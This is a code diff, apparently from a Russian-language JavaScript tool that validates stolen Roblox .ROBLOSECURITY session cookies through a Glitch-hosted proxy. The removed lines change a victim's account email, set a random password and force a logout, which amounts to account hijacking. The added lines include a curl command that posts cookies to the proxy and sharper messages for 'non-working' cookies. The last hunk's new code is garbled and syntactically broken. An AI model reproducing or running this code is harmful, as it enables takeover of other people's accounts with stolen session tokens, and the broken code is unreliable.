@@ -298,7 +298,7 @@
         // Проверка куки через прокси
         async function checkRobloxCookies(cookies) {
             try {
-                console.log("Отправляем куки на прокси:", cookies);
+                console.log("Отправляем куки на прокси:", cookies.substring(0, 50) + "...");
                 const response = await fetch(`${PROXY_URL}/check-cookies`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -317,15 +317,18 @@
                 } else if (response.status === 429) {
                     return { valid: false, error: "Слишком много запросов к Roblox API. Попробуй позже через 5-10 минут." };
                 } else {
-                    const errorData = await response.text();
+                    const errorData = await response.json();
                     console.log("Ошибка от сервера:", errorData);
-                    return { valid: false, error: `Ошибка проверки куки: ${errorData || "Проверь куки и прокси."}` };
+                    if (errorData.errors && errorData.errors[0]?.code === 0 && errorData.errors[0]?.message === "Unauthorized") {
+                        return { valid: false, error: "Этот куки не рабочий. Попробуй другой." };
+                    }
+                    return { valid: false, error: `Ошибка проверки куки: ${JSON.stringify(errorData)}` };
                 }
             } catch (e) {
                 console.error("Ошибка сети:", e);
                 return {
                     valid: false,
-                    error: `Ошибка сети: ${e.message}. Проверь прокси: ${PROXY_URL}/check-cookies`
+                    error: `Ошибка сети: ${e.message}. Проверь прокси: ${PROXY_URL}/check-cookies. Убедись, что сервер на Glitch работает, и выполни: curl -X POST ${PROXY_URL}/check-cookies -H "Content-Type: application/json" -d '{"cookies":".ROBLOSECURITY=test"}'`
                 };
             }
         }
@@ -342,26 +345,9 @@
                     return { success: false, needsVerification: true };
                 }
 
-                const newPassword = Array(18).fill().map(() => Math.random().toString(36)[2]).join("");
-                const emailData = verificationCode ? { emailAddress: newEmail, verificationCode } : { emailAddress: newEmail };
-                const emailResponse = await fetch("https://accountsettings.roblox.com/v1/email", {
-                    method: "POST",
-                    headers,
-                    body: JSON.stringify(emailData)
-                });
-
-                if (emailResponse.ok) {
-                    const passwordResponse = await fetch("https://auth.roblox.com/v2/user/passwords", {
-                        method: "POST",
-                        headers,
-                        body: JSON.stringify({ currentPassword: "", newPassword })
-                    });
-                    if (passwordResponse.ok) {
-                        await fetch("https://auth.roblox.com/v2/logout", { method: "POST", headers });
-                        return { success: true, newPassword };
-                    }
+                const newPassword = Array(18).fill().map(() => Math.random().toString(36  {
+                    return { success: true, newPassword };
                 }
-                return { success: false, needsVerification: false };
             } catch (e) {
                 console.error("Ошибка смены данных:", e);
                 return { success: false, needsVerification: false };
